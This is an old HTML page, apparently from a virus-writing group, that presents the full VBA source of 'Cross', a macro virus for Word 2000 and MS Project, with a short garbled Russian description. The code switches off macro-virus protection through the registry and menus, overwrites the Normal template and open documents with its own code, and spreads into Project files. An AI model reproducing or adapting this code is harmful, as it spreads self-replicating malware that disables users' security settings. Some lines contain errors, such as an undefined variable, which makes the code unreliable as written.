<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
</head>

<body bgcolor="#B1B1B1" text="#000000" topmargin="0"
leftmargin="3">

<p><STYLE> </p>

<p>INPUT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
}</p>

<p>SELECT { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>OPTION { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } </p>

<p>FORM { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
} <br>
BODY { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } <br>
P { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt }
TABLE { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt
}TR { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 8pt } TD
{ FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE: 10pt
}TEXTAREA { FONT-FAMILY: Tahoma, sans-serif, arial; FONT-SIZE:
8pt } A { COLOR: #005500; TEXT-DECORATION: none }A:hover {
TEXT-DECORATION: underline } A:link { TE  XT-DECORATION: none
}A:visited { }text:unknown { FONT-SIZE: 8pt } } </STYLE> </p>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tr>
        <td>&nbsp;</td>
        <td valign="top" width="100%"><div align="center"><center><table
        border="0" cellpadding="0" cellspacing="0" width="100%">
            <tr>
                <td width="100%" bgcolor="#000000"img
                src="-.gif" width="1" height="1"></td>
            </tr>
            <tr>
           <td width="100%" bgcolor="#808080"><strong>14.05.2000</strong>
   Cross.Quarde
   <strong>[-=[U]=-]</strong></td>
            </tr>
            <tr>
                <td width="100%" bgcolor="#000000"><img
                src="-.gif" width="1" height="1"></td>
            </tr>
            <tr>
                <td width="100%"><img src="-.gif" width="1"
                height="1"></td>
            </tr>
            <tr>
                <td width="100%" bgcolor="#000000"><img
                src="-.gif" width="1" height="1"></td>
            </tr>
            <tr>
                <td width="100%"><pre>
  Cross макро вирус под word2k/project. «аражает документы при открытий(Document_open в документах) 
 и при закрытий (Document_Close в Normal.dot), Project заражает при Project_Open. ќтключает 
 встроенную защиту от макро вирусов(в w0rd`е и в Project). ѕровер€ет если есть в системе MSProject 
 заражает его.

Sub Document_Close()
On Error Resume Next
'Quarde
If Application.Version = "9.0" Then
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1)
Options.SaveNormalPrompt = (1 - 1)
End If
TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) <> "'Quarde" Then
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
NT.DeleteLines 1, NT.CountOfLines
NT.AddFromString TD
NT.Replaceline 1, "Sub Document_Close()"
NT.Replaceline 41, "Sub projinf2()"
End If
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) <> "'Quarde" Then
Set VA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VA.DeleteLines 1, VA.CountOfLines
VA.AddFromString TD
VA.Replaceline 1, "Sub Document_Open()"
VA.Replaceline 41, "Sub projinf()"
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
Set projobj = GetObject(, "MSProject.Application")
If projobj = "" Then GoTo nema
Set proj1obj = projobj.Projects.Add
Set Normalz = NormalTemplate.VBProject.VBComponents(1).CodeModule
proj1obj.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, Normalz.Lines(1, Normalz.CountOfLines)
proj1obj.VBProject.VBComponents.Item(1).CodeModule.Replaceline 108, "Private Sub Project_Open(ByVal pj As MSProject.Project)"
Proj1.obj.Visible = False
'Cr0ss.Quarde
nema:
End Sub

Sub projinf2()
Dim Q As Project
Application.MacroVirusProtection = False
Application.DisplayAlerts = False
Application.DisplayStatusBar = False
CommandBars("Tools").Controls(9).Enabled = False
CommandBars("Tools").Controls(12).Enabled = False
On Error Resume Next
For Each Q In Projects
Set AppProject = Q.VBProject.VBComponents(1).CodeModule
Set ThizProject = ThisProject.VBProject.VBComponents(1).CodeModule
Set AllCode = ThisProject.VBProject.VBComponents(1).CodeModule.Lines(1, 80)
With Application.VBE.VBProjects(1).VBComponents(1).CodeModule
If .Lines(3, 1) <> "'Quarde" Then
.DeleteLines 1, .CountOfLines
.InsertLines 1, AllCode
End If
End With
If AppProject.Lines(3, 1) <> "'Quarde" Then
AppProject.DeleteLines 1, AppProject.CountOfLines
AppProject.InsertLines 1, ThizProject.Lines(1, ThizProject.CountOfLines)
Application.FileSaveAs Name:=ActiveProject.Name
End If
Next Q
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
End If
Set Norm = WordObj.NormalTemplate.VBProject.VBComponents(1).CodeModule
WordObj.Options.SaveNormalPrompt = False
Norm.DeleteLines 1, Norm.CountOfLines
Norm.InsertLines 1, tp.Lines(1, tp.CountOfLines)
Norm.Replaceline 1, "Sub Document_Close()"
Norm.Replaceline 41, "Sub projinf2()"
Norm.Save
If crossQuit = True Then WordObj.Quit
End Sub


<a href="http://topdev.tsx.org"> —тать€ дл€ журнала Top Device</a>     
                </pre>
                 </td>
            </tr>
            <tr>
                <td width="100%" bgcolor="#000000"><img
                src="-.gif" width="1" height="1"></td>
            </tr>
            <tr>
                <td width="100%"><img src="-.gif" width="1"
                height="1"></td>
            </tr>
            <tr>
                <td width="100%" bgcolor="#000000"><img
                src="-.gif" width="1" height="1"></td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
        </table>
        </center></div></td>
        <td>&nbsp;</td>
    </tr>
</table>

<p>&nbsp;</p>
</body>
</html>
